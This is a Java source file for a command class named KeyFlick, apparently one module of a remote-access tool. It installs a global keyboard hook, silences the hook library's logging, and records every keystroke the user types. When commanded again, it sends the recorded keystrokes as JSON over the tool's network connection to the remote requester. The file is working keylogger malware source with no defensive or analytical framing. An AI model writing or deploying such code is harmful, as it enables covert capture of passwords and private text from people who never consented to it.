package Classes.Instructions;
import Classes.Connection;
import Classes.Instruction;
import Classes.Instructions.Helpers.KeyFlicker;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyFlick extends Instruction {
    public static String type = "keyflick";
    public static boolean running;
    private boolean enabled = true;
    public static ArrayList<String> typed = new ArrayList<String>();

    public KeyFlick(Connection connection) {
        super(connection, type);
    }

    public void execute(HashMap<String, Object> arguments, String from) {
        if (running) {
            running = false;
            complete(from);
            typed.clear();

            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException nativeHookException) {
                nativeHookException.printStackTrace();
            }

            return;
        }

        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        try {
            GlobalScreen.registerNativeHook();
            running = true;
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
        }

        GlobalScreen.addNativeKeyListener(new KeyFlicker());
    }

    public void complete(String from) {
        HashMap<String, String> toSend = new HashMap<String, String>();
        String jsonRes = json.toJson(typed);

        toSend.put("type", "reply");
        toSend.put("to", from);
        toSend.put("typed", jsonRes);

        String finishedString = json.toJson(toSend);

        System.out.println(finishedString);

        connection.send(finishedString);

        enabled = false;
    }
}